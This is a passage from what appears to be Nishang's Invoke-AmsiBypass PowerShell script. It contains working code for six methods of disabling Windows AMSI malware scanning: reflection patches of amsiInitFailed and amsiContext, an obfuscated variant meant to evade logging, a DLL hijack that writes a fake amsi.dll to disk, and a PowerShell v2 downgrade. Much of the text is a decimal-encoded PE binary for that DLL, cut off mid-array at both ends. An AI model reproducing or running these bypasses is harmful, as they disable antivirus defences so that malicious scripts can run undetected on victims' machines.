0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\" if (([IntPtr]::Size) -eq 8) { Write-Verbose \"64 bit process detected.\" $DllBytes = $AmsiX64 } elseif (([IntPtr]::Size) -eq 4) { Write-Verbose \"32 bit process detected.\" $DllBytes = $AmsiX86 } switch($method) { \"unload\" { Write-Verbose \"Using Matt Graeber's Reflection method.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)' } else { Write-Output \"Executing the bypass.\" [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } } \"unloadsilent\" { Write-Verbose \"Using Matt Graeber's Reflection method with WMF5 autologging bypass.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)' } else { Write-Output \"Executing the bypass.\" [Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True) } } \"unloadobfuscated\" { Write-Verbose \"Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging.\" if ($ShowOnly -eq $True) { $code = @\" Sv ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\" ); Invoke-Expression( -Join ( VaRIAbLe ('R9'+'hyT') -val )[ - 1..- (( VaRIAbLe ('R9'+'hyT') -val ).Length)]) \"@ Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output $code } else { Write-Output \"Executing the bypass.\" Sv ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\" ); Invoke-Expression( -Join ( VaRIAbLe ('R9'+'hyT') -val )[ - 1..- (( VaRIAbLe ('R9'+'hyT') -val ).Length)]) } } \"unload2\" { Write-Verbose \"Using Matt Graeber's second Reflection method.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)' } else { Write-Output \"Executing the bypass.\" [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141) } } \"dllhijack\" { Write-Verbose \"Using Cornelis de Plaa's DLL hijack method.\" if ($ShowOnly -eq $True) { Write-Output \"Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\" Write-Output \"Run the new powershell.exe and AMSI should be gone for that session.\" } else { [Byte[]] $temp = $DllBytes -split ' ' Write-Output \"Executing the bypass.\" Write-Verbose \"Dropping the fake amsi.dll to disk.\" [System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp) Write-Verbose \"Copying powershell.exe to the current working directory.\" Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd Write-Verbose \"Starting powershell.exe from the current working directory.\" & \"$pwd\\powershell.exe\" } } \"psv2\" { Write-Verbose \"Using PowerShell version 2 which doesn't support AMSI.\" if ($ShowOnly -eq $True) { Write-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\" } else { Write-Verbose \"Checking if .Net version 2.0.50727 is installed.\" $versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version if($versions -match \"2.0.50727\") { Write-Verbose \".Net version 2.0.50727 found.\" Write-Output \"Executing the bypass.\" powershell.exe -version 2 } else { Write-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\" } } } \"obfuscation\" { Write-Output \"AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\" Write-Output \"ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\" } } } function Invoke-AmsiBypass { <# .SYNOPSIS Nishang script which uses publicly known methods to bypass/avoid AMSI. .DESCRIPTION This script implements publicly known methods bypass or avoid AMSI on Windows machines. AMSI is a script malware detection mechanism enabled by default in Windows 10. (https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx) This script implements 6 methods of bypassing AMSI. unload - Method by Matt Graeber. Unloads AMSI from current PowerShell session. unload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session. unloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging. unloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. dllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) psv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI. The script also provides information on tools which can be used for obfuscation: ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation) .PARAMETER Method The method to be used for elevation. Defaut one is unloadsilent. .PARAMETER ShowOnly The bypass is not executed. Just shown to the user. .EXAMPLE PS > Invoke-AmsiBypass -Verbose Above command runs the unloadsilent method. .EXAMPLE PS > Invoke-PsUACme -Method unloadobfuscated -Verbose Above command runs the unloadobfuscated method. .LINK http://www.labofapenetrationtester.com/2016/09/amsi.html https://github.com/samratashok/nishang #> [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $False)] [ValidateSet(\"unload\",\"unloadsilent\",\"unloadobfuscated\",\"unload2\",\"dllhijack\",\"psv2\",\"obfuscation\")] [String] $Method = \"unloadsilent\", [Parameter(Position = 1, Mandatory = $False)] [Switch] $ShowOnly ) $AmsiX86 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 